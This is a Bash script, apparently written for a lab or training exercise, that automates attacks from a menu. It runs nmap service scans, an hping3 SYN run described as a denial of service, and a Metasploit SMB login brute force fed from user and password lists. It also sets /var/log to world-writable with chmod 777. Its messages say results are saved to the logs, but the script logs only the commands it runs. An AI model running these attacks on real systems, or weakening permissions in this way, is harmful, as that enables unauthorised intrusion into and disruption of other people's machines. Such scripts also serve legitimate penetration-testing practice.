#!/bin/bash

#By doing this it grants me permission to access the /var/log to make changes and allow to create log files
sudo chmod 777 /var/log 
cd /var/log
touch nmap.log hping3.log smb_bf.log
cd

#these .txt file has the information needed to run some of the commands below
touch pass.txt user.txt targetip.txt

#this is to input the date and time of the action that took place
sgtime=$(TZ=Asia/Singapore date)


	
echo "Attack Automation"
echo "------------------"
echo "Which attack would you like to choose?"
echo "1. Nmap - scan for vulnerable ports"
echo "2. Hping3 - Denial of Service (DOS) on chosen target ip address"
echo "3. msfconsole smb attack - brute force the smb port"
echo "----------------------------------------------------------------"
echo "Input your choice"

#I chose to use case statement so that is is easily invoked when the users inputs their choice
read OPTIONS
case $OPTIONS in
	
	1)
	
	echo "You have chosen to do Nmap"
	echo "Input IP to scan"
	#allow the user to specify which ip specifically they what to find out
	read IP
	#the input will be kept in the nmap.log that was created in the /var/log
	echo "$sgtime sudo nmap $IP -sV -Pn" >> /var/log/nmap.log
	echo "Results are recorded in /var/log/nmap.log"
	
	function nmap_scan()
	{ sudo nmap $IP -sV -Pn
		
	}
	nmap_scan
	
	;;
	2)
	
	echo "You have chosen to do Hping3"
	echo "Input IP to DOS"
	read IP
	echo "Input port"
	read PORT
	echo "$sgtime sudo hping3 -S $IP -p $PORT" >> /var/log/hping3.log
	echo "Results are recorded in /var/log/hping3.log"
	
	function hping_scan()
	{ sudo hping3 -S $IP -p $PORT -c 5
		
	}
	hping_scan
	
	;;
	3)
	echo 'use auxiliary/scanner/smb/smb_login' > newsmb.rc
	echo 'set rhost file:/home/kali/targetip.txt' >> newsmb.rc
	echo 'set smbdomain mydomain.local' >> newsmb.rc
	echo 'set pass_file pass.txt' >> newsmb.rc
	echo 'set user_file user.txt' >> newsmb.rc
	echo 'run' >> newsmb.rc
	echo 'exit' >> newsmb.rc
	
	echo "You have chosen msfconsole smb attack"
	
	echo "$sgtime msfconsole -qr newsmb.rc" >> /var/log/smb_bf.log
	
	function smb_attack()
	{ msfconsole -qr newsmb.rc
		
	}
	smb_attack
	
	echo "Results are recorded in var/log/smb_bf.log"
	
	;;
	*)
	#using the wildcard "*" any output that is not 1-3 the choice will be invalid	
	echo "Invalid Choice"
	;;

    esac
